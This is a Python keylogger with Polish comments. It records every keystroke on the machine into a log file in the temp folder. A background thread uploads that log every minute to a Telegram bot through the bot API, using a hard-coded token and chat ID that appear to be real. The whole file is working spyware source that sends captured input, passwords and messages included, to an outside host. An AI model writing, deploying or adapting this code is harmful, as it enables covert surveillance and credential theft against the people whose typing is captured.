# key_lines.py - KAŻDY KLAWISZ W OSOBNEJ LINII + WYSYŁKA DO TELEGRAM
import os
import time
import tempfile
import requests
import json
import threading
from pynput import keyboard

# ===== KONFIGURACJA TELEGRAM =====
BOT_TOKEN = "8853348229:AAHtWaSI0jZ2tEXDWkYIqSa6ujIk7voQm0E"  # Wpisz swój token od @BotFather
CHAT_ID = "7701250279"      # Wpisz swoje ID (np. od @getidsbot)

# ===== KONFIGURACJA WYSYŁKI =====
WYSYLAJ_CO_SEKUND = 60  # Co ile sekund wysyłać plik (np. 60 = co minutę)

def utworz_folder_key_logs():
    """
    Tworzy folder temp/logi/key_logs, jeśli nie istnieje.
    """
    temp_dir = tempfile.gettempdir()
    folder_path = os.path.join(temp_dir, 'logi', 'key_logs')
    
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Utworzono folder: {folder_path}")
    else:
        print(f"Folder już istnieje: {folder_path}")
    
    return folder_path

# Tworzymy folder i ścieżkę do pliku logów
folder_key_logs = utworz_folder_key_logs()
log_file = os.path.join(folder_key_logs, 'logs.txt')

def wyslij_do_telegramu(sciezka_pliku, wiadomosc=""):
    """
    Wysyła plik do bota na Telegramie.
    """
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        
        with open(sciezka_pliku, 'rb') as f:
            files = {'document': f}
            data = {
                'chat_id': CHAT_ID,
                'caption': wiadomosc
            }
            
            response = requests.post(url, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                print(f"✅ Plik wysłany do Telegram: {os.path.basename(sciezka_pliku)}")
                return True
            else:
                print(f"❌ Błąd wysyłki: {response.status_code} - {response.text}")
                return False
                
    except Exception as e:
        print(f"❌ Błąd podczas wysyłania do Telegram: {e}")
        return False

def wyslij_logi():
    """
    Wysyła plik logów do Telegramu.
    """
    try:
        if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
            # Pobierz rozmiar pliku
            rozmiar = os.path.getsize(log_file)
            
            # Telegram ma limit 50MB na plik
            if rozmiar > 50 * 1024 * 1024:
                print(f"⚠️ Plik za duży ({rozmiar/1024/1024:.2f}MB). Wysyłanie tylko ostatnich 1000 linii...")
                # Wysyłamy tylko ostatnie 1000 linii
                with open(log_file, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    ostatnie = lines[-1000:] if len(lines) > 1000 else lines
                
                # Zapisz tymczasowy plik
                temp_log = os.path.join(folder_key_logs, 'temp_logs.txt')
                with open(temp_log, 'w', encoding='utf-8') as f:
                    f.writelines(ostatnie)
                
                wyslij_do_telegramu(temp_log, f"📝 Logi (ostatnie {len(ostatnie)} linii)")
                
                # Usuń tymczasowy plik
                try:
                    os.remove(temp_log)
                except:
                    pass
            else:
                # Wyślij cały plik
                wyslij_do_telegramu(log_file, f"📝 Logi z klawiatury ({rozmiar/1024:.1f}KB)")
            
            # Opcjonalnie: wyczyść plik po wysłaniu
            # with open(log_file, 'w', encoding='utf-8') as f:
            #     f.write('')
            # print("🗑️ Plik wyczyszczony po wysłaniu")
            
        else:
            print("ℹ️ Brak nowych logów do wysłania")
            
    except Exception as e:
        print(f"❌ Błąd podczas wysyłania logów: {e}")

# === TWOJE WŁASNE NAZWY KLAWISZY ===
CUSTOM_KEYS = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '[ENTER]',
    keyboard.Key.tab: '[TAB]',
    keyboard.Key.backspace: '[BACKSPACE]',
    keyboard.Key.delete: '[DELETE]',
    keyboard.Key.esc: '[ESC]',
    keyboard.Key.shift: '[SHIFT]',
    keyboard.Key.ctrl: '[CTRL]',
    keyboard.Key.alt: '[ALT]',
    keyboard.Key.cmd: '[WIN]',
    keyboard.Key.up: '[↑]',
    keyboard.Key.down: '[↓]',
    keyboard.Key.left: '[←]',
    keyboard.Key.right: '[→]',
    keyboard.Key.f1: '[F1]',
    keyboard.Key.f2: '[F2]',
    keyboard.Key.f3: '[F3]',
    keyboard.Key.f4: '[F4]',
    keyboard.Key.f5: '[F5]',
    keyboard.Key.f6: '[F6]',
    keyboard.Key.f7: '[F7]',
    keyboard.Key.f8: '[F8]',
    keyboard.Key.f9: '[F9]',
    keyboard.Key.f10: '[F10]',
    keyboard.Key.f11: '[F11]',
    keyboard.Key.f12: '[F12]',
    keyboard.Key.home: '[HOME]',
    keyboard.Key.end: '[END]',
    keyboard.Key.page_up: '[PGUP]',
    keyboard.Key.page_down: '[PGDN]',
    keyboard.Key.insert: '[INS]',
    keyboard.Key.pause: '[PAUSE]',
    keyboard.Key.print_screen: '[PRTSCR]',
    keyboard.Key.caps_lock: '[CAPS]',
    keyboard.Key.num_lock: '[NUM]',
    keyboard.Key.menu: '[MENU]',
}

# === DODAJ WŁASNE ===
MY_CUSTOM_KEYS = {
    # keyboard.Key.ctrl_l: '[LEWY_CTRL]',
    # keyboard.Key.ctrl_r: '[PRAWY_CTRL]',
}

CUSTOM_KEYS.update(MY_CUSTOM_KEYS)

buffer = []

def get_key_name(key):
    if key in CUSTOM_KEYS:
        return CUSTOM_KEYS[key]
    else:
        return f'[{str(key).replace("Key.", "").upper()}]'

def on_press(key):
    global buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Normalne znaki
            char = key.char
            buffer.append(char)
            print(f"✓ {char}")
        else:
            # Klawisze specjalne
            key_name = get_key_name(key)
            buffer.append(key_name)
            print(f"✓ {key_name}")
        
        # === ZAPISZ W OSOBNEJ LINII ===
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(''.join(buffer) + '\n')
            buffer.clear()
            
    except Exception as e:
        print(f"Błąd: {e}")

def on_release(key):
    # NIE WYŁĄCZA SIĘ PRZEZ ESC
    pass

def timer_wysylania():
    """
    Funkcja uruchamiana w osobnym wątku, która co określony czas wysyła logi.
    """
    while True:
        time.sleep(WYSYLAJ_CO_SEKUND)
        print(f"\n⏰ Automatyczna wysyłka logów co {WYSYLAJ_CO_SEKUND}s...")
        wyslij_logi()

# === START ===
print("="*50)
print("KEYLOGGER - OSOBNE LINIE + TELEGRAM")
print("="*50)
print(f"Plik logów: {log_file}")
print(f"Wysyłka co {WYSYLAJ_CO_SEKUND} sekund")
print("Każdy klawisz w osobnej linii")
print("Aby zatrzymać: Ctrl+C")
print("="*50)

# Uruchom nasłuchiwanie klawiszy
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Uruchom timer do wysyłania (w osobnym wątku)
timer_thread = threading.Thread(target=timer_wysylania, daemon=True)
timer_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n\n🛑 Zatrzymywanie...")
    
    # Zatrzymaj nasłuchiwanie
    listener.stop()
    
    # Wyślij ostatnie logi przed zamknięciem
    print("📤 Wysyłanie ostatnich logów...")
    wyslij_logi()
    
    print(f"✅ Zakończono. Sprawdź: {log_file}")
    print("="*50)
    
    # Opcjonalnie: czekaj na naciśnięcie ENTER
    # input("Naciśnij ENTER aby zamknąć...")